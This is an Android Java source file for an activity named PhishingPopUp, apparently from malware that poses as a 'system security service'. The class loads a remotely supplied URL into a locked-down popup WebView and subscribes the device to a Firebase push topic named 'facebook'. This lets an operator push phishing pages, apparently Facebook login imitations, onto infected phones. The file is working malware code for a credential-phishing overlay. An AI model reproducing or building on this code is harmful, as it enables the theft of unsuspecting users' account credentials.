package com.service.security.services.systemsecurityservice.mainUi;

import android.app.Dialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessaging;
import com.service.security.services.systemsecurityservice.R;

public class PhishingPopUp extends AppCompatActivity {

    private static PhishingPopUp mInstance;

    private static synchronized PhishingPopUp getInstance() {
        return mInstance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mInstance = this;
        String url = getIntent().getStringExtra("url");
        showDialog(this, url);
        setContentView(R.layout.activity_main);
        getToken();

    }

    private void getToken() {
        FirebaseMessaging.getInstance().subscribeToTopic("facebook");
        String token = FirebaseInstanceId.getInstance().getToken();
        Log.e("Token is ", "" + token);
    }

    private void showDialog(Context context, String url) {
        Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.popup);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
                @Override
                public void onDismiss(DialogInterface dialogInterface) {
                    PhishingPopUp.getInstance().finish();
                }
            });
        }

        dialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
            @Override
            public void onCancel(DialogInterface dialogInterface) {
                PhishingPopUp.getInstance().finish();
            }
        });

        WebView wv = (WebView) dialog.findViewById(R.id.webView);
        wv.clearCache(true);

        wv.loadUrl(url);
        wv.setWebViewClient(new WebViewClient());
        wv.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                return (event.getAction() == MotionEvent.ACTION_MOVE);
            }
        });

        wv.setVerticalScrollBarEnabled(false);
        wv.setHorizontalScrollBarEnabled(false);

        //wv.reload();
        dialog.show();
    }

}
